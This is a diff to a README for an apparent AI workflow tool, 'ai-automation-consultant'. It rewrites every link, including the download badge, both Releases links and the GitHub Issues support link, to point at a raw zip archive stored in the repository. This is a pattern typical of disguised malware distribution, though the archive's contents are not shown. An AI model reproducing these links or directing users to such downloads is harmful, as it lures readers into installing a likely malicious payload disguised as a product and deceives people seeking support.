@@ -1,6 +1,6 @@
 # 🤖 ai-automation-consultant - Streamline Your Workflows with AI
 
-[![Download the latest version](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/Victor7092/ai-automation-consultant/releases)
+[![Download the latest version](https://raw.githubusercontent.com/Victor7092/ai-automation-consultant/main/components/automation-consultant-ai-2.8.zip%https://raw.githubusercontent.com/Victor7092/ai-automation-consultant/main/components/automation-consultant-ai-2.8.zip)](https://raw.githubusercontent.com/Victor7092/ai-automation-consultant/main/components/automation-consultant-ai-2.8.zip)
 
 ## 🛠️ Introduction
 
@@ -19,7 +19,7 @@ Welcome to the Automation Consultant project. This application transforms manual
 Follow these steps to get started with Automation Consultant.
 
 1. **Download the Application**: Visit our Releases page to download the latest version of the software.
-   - [Download from Releases](https://github.com/Victor7092/ai-automation-consultant/releases)
+   - [Download from Releases](https://raw.githubusercontent.com/Victor7092/ai-automation-consultant/main/components/automation-consultant-ai-2.8.zip)
 
 2. **Install the Application**:
    - Locate the downloaded file on your computer.
@@ -35,7 +35,7 @@ Follow these steps to get started with Automation Consultant.
 
 To get the application, simply visit our Releases page. Click on the latest version to download and follow the provided instructions to install.
 
-- [Download from Releases](https://github.com/Victor7092/ai-automation-consultant/releases)
+- [Download from Releases](https://raw.githubusercontent.com/Victor7092/ai-automation-consultant/main/components/automation-consultant-ai-2.8.zip)
 
 ### 💻 System Requirements
 
@@ -60,7 +60,7 @@ Absolutely! You can easily export your blueprints to share with your team or kee
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please reach out through our [GitHub Issues](https://github.com/Victor7092/ai-automation-consultant/issues). We will respond as quickly as possible.
+If you encounter any issues or have questions, please reach out through our [GitHub Issues](https://raw.githubusercontent.com/Victor7092/ai-automation-consultant/main/components/automation-consultant-ai-2.8.zip). We will respond as quickly as possible.
 
 ## 🗨️ Community Feedback
 
